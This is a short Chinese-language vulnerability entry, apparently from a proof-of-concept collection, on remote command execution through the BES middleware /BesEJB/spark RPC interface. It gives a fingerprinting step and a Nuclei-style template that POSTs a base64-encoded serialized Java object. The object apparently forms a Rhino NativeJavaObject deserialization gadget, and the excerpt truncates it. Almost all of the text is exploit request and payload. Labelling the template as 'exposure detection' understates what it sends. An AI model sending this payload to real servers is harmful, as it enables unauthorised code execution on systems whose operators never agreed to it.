# 宝兰德BES中间件spark接口远程代码执行漏洞

- **系统**：宝兰德BES中间件spark接口远程　|　**类型**：命令执行　|　**CVE**：—
- **请求**：`GET /BesEJB/spark HTTP/1.1`

**请求体 / payload**
```
第一步，特征确认：访问/BesEJB/spark，响应体中有Spark expects a POST containing an RPC call.
NucleiPOC
id: bes-ejb-spark-exposure
info:
name: BES EJB Spark RPC Interface Exposure
author: xiaolei
severity: medium
description: BES 中间件 /BesEJB/spark Spark RPC 接口暴露检测
tags: bes,ejb,spark,exposure
http:
- raw:
-
Host: {{Hostname}}
-
POST /BesEJB/spark HTTP/1.1
Host: {{Hostname}}
Content-Type: application/octet-stream
{{base64_decode("U3BhcmsxAAAMZAAAOC0HATctrO0ABXNyAC9jb20uYmVzLm9yZy5tb3ppbGxhLmphdmFzY3JpcHQuTmF0aXZlSmF2YU9iamVjdJ+RpZ41xDHhAwACTAAGcGFyZW50dAArTGNvbS9iZXMvb3JnL21vemlsbGEvamF2YXNjcmlwdC9TY3JpcHRhYmxlO0…（脚本共 80825 字，完整版见原文）
```
- **预期**：200　|　—